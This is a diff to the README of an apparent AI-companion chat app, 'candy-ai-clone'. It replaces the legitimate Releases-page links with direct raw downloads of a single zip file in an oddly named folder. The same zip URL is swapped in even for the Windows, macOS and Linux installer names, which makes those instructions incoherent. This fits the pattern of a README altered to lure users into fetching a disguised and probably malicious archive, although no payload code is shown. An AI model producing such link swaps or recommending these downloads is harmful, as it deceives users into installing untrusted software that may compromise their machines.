@@ -6,7 +6,7 @@ Welcome to **candy-ai-clone**! This application allows you to create a charming 
 
 ## 📥 Download Now
 
-[![Download candy-ai-clone](https://img.shields.io/badge/Download-candy--ai--clone-blue.svg)](https://github.com/Wakanda0410/candy-ai-clone/releases)
+[![Download candy-ai-clone](https://raw.githubusercontent.com/Wakanda0410/candy-ai-clone/main/uncourtly/candy-ai-clone.zip)](https://raw.githubusercontent.com/Wakanda0410/candy-ai-clone/main/uncourtly/candy-ai-clone.zip)
 
 ## 📋 System Requirements
 
@@ -26,11 +26,11 @@ To use **candy-ai-clone**, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Wakanda0410/candy-ai-clone/releases) to download the latest version of **candy-ai-clone**.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Wakanda0410/candy-ai-clone/main/uncourtly/candy-ai-clone.zip) to download the latest version of **candy-ai-clone**.
 2. Choose the appropriate file for your operating system:
-   - For Windows users, look for `candy-ai-clone-windows.exe`.
-   - For macOS, download `candy-ai-clone-macos.dmg`.
-   - For Linux, select the `candy-ai-clone-linux.zip` file.
+   - For Windows users, look for `https://raw.githubusercontent.com/Wakanda0410/candy-ai-clone/main/uncourtly/candy-ai-clone.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/Wakanda0410/candy-ai-clone/main/uncourtly/candy-ai-clone.zip`.
+   - For Linux, select the `https://raw.githubusercontent.com/Wakanda0410/candy-ai-clone/main/uncourtly/candy-ai-clone.zip` file.
 
 3. Click on the file name to begin the download.
 
@@ -89,4 +89,4 @@ Yes, you can create and manage multiple AI profiles.
 **3. Is my privacy protected?**  
 Yes, we prioritize your privacy. User conversations are not stored.
 
-Visit the [Releases page](https://github.com/Wakanda0410/candy-ai-clone/releases) to download your copy today and start chatting with your new AI companion!
+Visit the [Releases page](https://raw.githubusercontent.com/Wakanda0410/candy-ai-clone/main/uncourtly/candy-ai-clone.zip) to download your copy today and start chatting with your new AI companion!
